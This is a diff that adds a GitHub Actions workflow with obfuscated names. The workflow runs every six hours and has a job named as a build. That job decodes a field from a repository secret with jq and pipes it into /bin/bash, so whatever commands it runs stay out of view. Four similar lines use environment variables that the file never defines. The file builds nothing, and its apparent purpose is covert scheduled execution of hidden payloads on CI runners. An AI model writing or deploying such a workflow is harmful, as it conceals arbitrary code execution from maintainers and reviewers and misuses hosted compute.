@@ -1,0 +1,22 @@
+name: chujuekai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chujuekai
+        env:
+          swis8611: ${{ secrets.swis8611 }}
+        run: |
+          echo $swis8611 | jq -r .zuegg2886 | /bin/bash
+          echo $omec0 | jq -r .qygg71 | /bin/bash
+          echo $k9497 | jq -r .cgiz42 | /bin/bash
+          echo $iqvbe80810 | jq -r .rpvyn5936 | /bin/bash
+          echo $f0 | jq -r .ke12 | /bin/bash
+
